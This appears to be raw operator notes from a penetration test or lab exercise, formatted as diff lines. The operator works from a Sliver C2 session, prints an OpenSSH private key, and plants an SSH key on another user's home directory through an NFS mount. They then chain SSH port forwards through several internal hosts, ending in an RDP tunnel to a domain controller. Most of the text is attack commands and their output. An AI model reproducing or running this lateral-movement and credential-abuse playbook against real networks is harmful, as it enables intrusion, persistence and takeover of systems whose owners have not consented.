+kOAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJoD+Fc/9j3mhCDO
+PmAwV7//vB88+Jl9wYxGsGNQjUcr3kvVobFvDlZP1WMM8nZ5ZhLygRIpR49El8aVb6hJMq
+wAAAAhAKKJGi0ZBuRt0PLBzXTKtZHGW8z3X7JevAD51RpD+rfcAAAAAAECAwQFBgc=
+-----END OPENSSH PRIVATE KEY-----
+
+
+sliver (guilty_spark) > cat rivendell_id_ecdsa1.pub
+
+ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJoD+Fc/9j3mhCDOPmAwV7//vB88+Jl9wYxGsGNQjUcr3kvVobFvDlZP1WMM8nZ5ZhLygRIpR49El8aVb6hJMqw= 
+
+
+
+ls
+authorized_keys  rivendell_id_ecdsa   rohan_id_ecdsa
+known_hosts      rivendell_id_ecdsa1
+user2@ip-10-7-1-60:~/.ssh$ cat authorized_keys 
+user2@ip-10-7-1-60:~/.ssh$ cd ..
+user2@ip-10-7-1-60:~$ ssh -L 2122:10.4.1.150:22 -p 2022 FBaggins@localhost -i .ssh/rivendell_id_ecdsa1
+Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.19.0-1029-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Jul 29 06:04:36 UTC 2023
+
+  System load:  0.0               Processes:             112
+  Usage of /:   28.1% of 7.57GB   Users logged in:       1
+  Memory usage: 25%               IPv4 address for ens5: 10.3.1.200
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sat Jul 29 05:41:42 2023 from 10.2.1.101
+
+
+cd /etc
+FBaggins@Rivendell:/etc$ cd ..
+FBaggins@Rivendell:/$ cd /mnt
+FBaggins@Rivendell:/mnt$ ls
+aragorn  dev_storage  elf-king
+FBaggins@Rivendell:/mnt$ cd aragorn/
+FBaggins@Rivendell:/mnt/aragorn$ ls
+dev_storage  home
+FBaggins@Rivendell:/mnt/aragorn$ cd home
+FBaggins@Rivendell:/mnt/aragorn/home$ ls
+Balin  ubuntu
+FBaggins@Rivendell:/mnt/aragorn/home$ cd Balin
+FBaggins@Rivendell:/mnt/aragorn/home/Balin$ ls
+FBaggins@Rivendell:/mnt/aragorn/home/Balin$ ls -a
+.  ..  .bash_history  .bash_logout  .bashrc  .cache  .profile  .ssh
+FBaggins@Rivendell:/mnt/aragorn/home/Balin$ cd .ssh
+FBaggins@Rivendell:/mnt/aragorn/home/Balin/.ssh$ ls
+authorized_keys
+FBaggins@Rivendell:/mnt/aragorn/home/Balin/.ssh$ touch id_rsa.pub
+FBaggins@Rivendell:/mnt/aragorn/home/Balin/.ssh$ cd 
+FBaggins@Rivendell:~$ ls
+id_rsa  id_rsa.pub.pub  kernel-update
+FBaggins@Rivendell:~$ cat id_rsa.pub.pub 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDJ/0IKRXIQLZHt573gAiFDO6tq2xMiVBobhzmyHU5q0Fmi+4nJLkq0U2QUnke4lwSKrGNyTJZQFHuAw72ni9kxM2xZiRUA9DLce/5mwcIhgqdg+4OSVywSTamGyKqWeIVMd7B06i2Ht1GSZ+n8WS5c4t3r3h9nJmMozwUa7aY3iIRvJbwWLHJawnvuKNeiMSyahedlzckHL+ZYd3C9Uw5s6YYjaD1zozzSeFt0oixhSNBOFUR/QuezKiAxg0u37aCSJIKg833vwRxte9zFxZmDfdgD2hwDHbpeLJqnscXxYHO7Ao6X+G7kLHu915zOwrvMy0nfgtc4Xu72zFAJ897P4V2RtF8YK1IdN8Fz8OzEzCjuFJP63OqZddfX2dqB/DoGMWleeHFXm+ncwzpJg+6X70iMBKdiEtTpgWEbzDZv3x7eSr7rc8BSkT++BensyO+QIuvgUdb0CSpgvSMpbcOg9bs+Re0GsETTpSsnOyZUM7QpxuRuxSRK4R+2u/vgvws= FBaggins@Rivendell
+FBaggins@Rivendell:~$ cd /mnt/aragorn/home/Balin/.ssh
+FBaggins@Rivendell:/mnt/aragorn/home/Balin/.ssh$ ls
+authorized_keys  id_rsa.pub
+FBaggins@Rivendell:/mnt/aragorn/home/Balin/.ssh$ vim id_rsa.pub 
+
+
+
+
+ss -tp
+State    Recv-Q    Send-Q        Local Address:Port          Peer Address:Port     Process    
+ESTAB    0         0                10.3.1.200:42244           10.4.1.150:ssh                 
+ESTAB    0         0                10.3.1.200:ssh             10.2.1.101:49760               
+ESTAB    0         0                10.3.1.200:ssh             10.2.1.101:49835               
+ESTAB    0         0                10.3.1.200:919             10.4.1.150:nfs                 
+ESTAB    0         52               10.3.1.200:ssh             10.2.1.101:49843               
+ESTAB    0         0                10.3.1.200:ssh             10.2.1.101:49856               
+ESTAB    0         0                10.3.1.200:ssh             10.2.1.101:49838      
+
+
+portfwd add -b 127.0.0.1:2222 -r 10.5.1.200:22
+
+[*] Port forwarding 127.0.0.1:2222 -> 10.5.1.200:22
+
+sliver (guilty_spark) > portfwd
+
+ ID   Session ID                             Bind Address     Remote Address 
+==== ====================================== ================ ================
+  1   da3b71ee-00f5-42ab-a7d2-550ac67da5a3   127.0.0.1:2022   10.3.1.200:22  
+  2   da3b71ee-00f5-42ab-a7d2-550ac67da5a3   127.0.0.1:2122   10.4.1.150:22  
+  3   da3b71ee-00f5-42ab-a7d2-550ac67da5a3   127.0.0.1:2222   10.5.1.200:22  
+ 
+ 
+ 
+ 
+ cat id_rsa.pub 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1iLRCkYu39Yean/J50Ke4JpaoyyRtgEkIhOe3Xy+KOa2tja+bqiBgAKG1E5LfS4MKqtue264TdSwJFcUNDe3UL1qmgb6TerrppTnK64nFI0xuH1h95Hi9jprMruy4pjCnHzsg7NJkQiu1bqmanzjfmGNazRzKVon14hyeW3yirUzoIB8K3qMG3aVUTY7jfUKjIOMttBH9g1u+AVQg9QOKTyiaYrxerpg/7NZKZLCVMPDSnc1wW39Nc2UuJIIUYHmm0vK3xBydRa17ufQI0K1nrRlaIJOuGQBOpuOzCXLq4i/t/fxUJxvWQOO16tw6FIC+vf57dOkGAy/iXo3k/R7jGL3g2SIC/zPaZYUw+EHb5UuLravU12wlwGdvKNLJNeUWld2jw2qUPSPIqLjHZWiFqR5SoY9ZhlPNVWS5LLLppHzO3lkrIg3JnMVwCFjmWNO1YXDFdIDT1A8y7k1Awc/N5dPcTlyvHz6CYx5Uga7qVwrXC/V3Bvsl7aNOqAp0KdE= user2@ip-10-7-1-60
+user2@ip-10-7-1-60:~/.ssh$ cd ..
+user2@ip-10-7-1-60:~$ ssh -L 2222:10.5.1.200:22 -p 2122 Balin@localhost -i .ssh/id_rsa
+bind [127.0.0.1]:2222: Address already in use
+channel_setup_fwd_listener_tcpip: cannot listen to port: 2222
+Could not request local forwarding.
+Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.19.0-1029-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Jul 29 15:36:05 UTC 2023
+
+  System load:  0.0               Processes:             119
+  Usage of /:   28.1% of 7.57GB   Users logged in:       1
+  Memory usage: 25%               IPv4 address for ens5: 10.4.1.150
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sat Jul 29 15:16:17 2023 from 10.3.1.200
+Balin@Misty-Moutains:~$ l
+
+
+ ping 10.5.1.200
+PING 10.5.1.200 (10.5.1.200) 56(84) bytes of data.
+64 bytes from 10.5.1.200: icmp_seq=1 ttl=64 time=0.245 ms
+64 bytes from 10.5.1.200: icmp_seq=2 ttl=64 time=0.260 ms
+64 bytes from 10.5.1.200: icmp_seq=3 ttl=64 time=0.235 ms
+
+
+ss -nlpt
+State   Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process  
+LISTEN  0        4096       127.0.0.53%lo:53             0.0.0.0:*              
+LISTEN  0        4096             0.0.0.0:111            0.0.0.0:*              
+LISTEN  0        128              0.0.0.0:22             0.0.0.0:*              
+LISTEN  0        64               0.0.0.0:2049           0.0.0.0:*              
+LISTEN  0        4096             0.0.0.0:55771          0.0.0.0:*              
+LISTEN  0        4096             0.0.0.0:48581          0.0.0.0:*              
+LISTEN  0        4096             0.0.0.0:47511          0.0.0.0:*              
+LISTEN  0        64               0.0.0.0:33705          0.0.0.0:*              
+LISTEN  0        4096             0.0.0.0:41801          0.0.0.0:*              
+LISTEN  0        4096                [::]:59605             [::]:*              
+LISTEN  0        4096                [::]:51849             [::]:*              
+LISTEN  0        4096                [::]:57529             [::]:*              
+LISTEN  0        4096                [::]:111               [::]:*              
+LISTEN  0        128                 [::]:22                [::]:*              
+LISTEN  0        64                  [::]:2049              [::]:*              
+LISTEN  0        4096                [::]:35799             [::]:*              
+LISTEN  0        64                  [::]:36197             [::]:*       
+
+
+^C
+--- 10.5.1.200 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2053ms
+rtt min/avg/max/mdev = 0.235/0.246/0.260/0.010 ms
+
+
+
+chmod 600 anduin_id_ecdsa 
+user2@ip-10-7-1-60:~/.ssh$ ssh -L 0.0.0.0:3322:10.5.1.20:3389 -p 3222 galadriel@localhost -i .ssh/anduin_id_ecdsa
+bind [127.0.0.1]:2322: Address already in use
+channel_setup_fwd_listener_tcpip: cannot listen to port: 2322
+Could not request local forwarding.
+Register this system with Red Hat Insights: insights-client --register
+Create an account or view all your systems at https://red.ht/insights-dashboard
+Last login: Sat Jul 29 15:35:39 2023 from 10.4.1.150
+[galadriel@Anduin ~]$ whoami
+galadriel
+[galadriel@Anduin ~]$ 
+
+
+ssh -L 2422:10.5.1.20:22 -p 2322 boromir@localhost -i .ssh/rohan_id_ecdsa
+The authenticity of host '[localhost]:2322 ([127.0.0.1]:2322)' can't be established.
+ED25519 key fingerprint is SHA256:DuRBQ/7Ut0i+PEjJv0Zlk//q3KFQ328Y9p1ipCKNYAM.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[localhost]:2322' (ED25519) to the list of known hosts.
+bind [127.0.0.1]:2422: Address already in use
+Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.19.0-1028-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Jul 29 15:49:45 UTC 2023
+
+  System load:  0.0               Processes:             100
+  Usage of /:   21.0% of 7.57GB   Users logged in:       0
+  Memory usage: 23%               IPv4 address for ens5: 10.5.1.100
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sat Jul 29 05:41:51 2023 from 10.5.1.200
+
+Baggins
+ssh -L 3122:10.4.1.150:22 -p 3022 FBaggins@localhost -i .ssh/rivendell_id_ecdsa1
+
+Balin
+ssh -L 3222:10.5.1.200:22 -p 3122 Balin@localhost -i .ssh/id_rsa
+
+galadriel
+ssh -L 3322:10.5.1.100:22 -p 3222 galadriel@localhost -i anduin_id_ecdsa 
+
+boromir
+ssh -L 3422:10.5.1.20:22 -p 3322 boromir@localhost -i .ssh/rohan_id_ecdsa
+
+
+rdp into DC
+ssh -L 0.0.0.0:3322:10.5.1.20:3389 -p 3222 galadriel@localhost -i .ssh/anduin_id_ecdsa
+
+
+ssh -L 0.0.0.0:2422:10.6.1.47:3389 -p 2322 boromir@localhost -i .ssh/rohan_id_ecdsa
+
+
+
+
+
+
+
+
+
+
+
+
+
